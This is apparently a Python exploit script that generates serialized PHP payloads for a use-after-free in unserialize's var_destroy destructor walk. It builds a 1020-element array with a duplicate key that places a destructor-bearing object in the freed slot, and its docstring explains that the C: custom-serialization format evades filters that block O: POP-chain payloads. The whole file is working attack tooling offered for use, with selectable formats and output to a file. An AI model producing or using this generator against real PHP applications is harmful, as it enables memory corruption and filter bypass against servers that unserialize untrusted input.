#!/usr/bin/env python3
"""shape12_gen.py — payload generator for the zero4 var_destroy re-entry UAF
with a selectable entry format.

Both formats instantiate the destructor-bearing class (Stage1) inside the
dup-key'd slot of the 1020-element outer array, so its __destruct fires
during var_destroy's unbracketed dtor walk:

  --format=O   i:9998;O:6:"Stage1":0:{}   standard object format
  --format=C   i:9998;C:6:"Stage1":0:{}   custom-serialization format

The C: variant works on the whole PHP 8.4/8.5 release fleet because
object_custom() unconditionally object_init_ex()'s classes with
ce->unserialize == NULL (GH-22046's guard never left master). Any app that
passes user input to unserialize() and filters/rewrites O: payloads (the
classic POP-chain mitigation) remains reachable via C:.

usage: shape12_gen.py [--format O|C] [--class Stage1] [--file out.txt]
"""
import argparse


def payload(fmt: str, cls: str) -> str:
    els = [f"i:{k};i:1;" for k in range(1018)]
    if fmt == "C":
        els.append(f'i:9998;C:{len(cls)}:"{cls}":0:{{}}')
    else:
        els.append(f'i:9998;O:{len(cls)}:"{cls}":0:{{}}')
    els.append("i:9998;i:5;")  # dup-key: slot ownership flips to the object
    return "a:1020:{" + "".join(els) + "}"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--format", choices=["O", "C"], default="C",
                    help="entry format for the destructor object (default C)")
    ap.add_argument("--class", dest="cls", default="Stage1",
                    help="class name to instantiate (default Stage1)")
    ap.add_argument("--file", default=None, help="write payload here")
    a = ap.parse_args()
    p = payload(a.format, a.cls)
    if a.file:
        with open(a.file, "w") as f:
            f.write(p)
        print(f"wrote {len(p)} bytes to {a.file}")
    else:
        print(p)


if __name__ == "__main__":
    main()
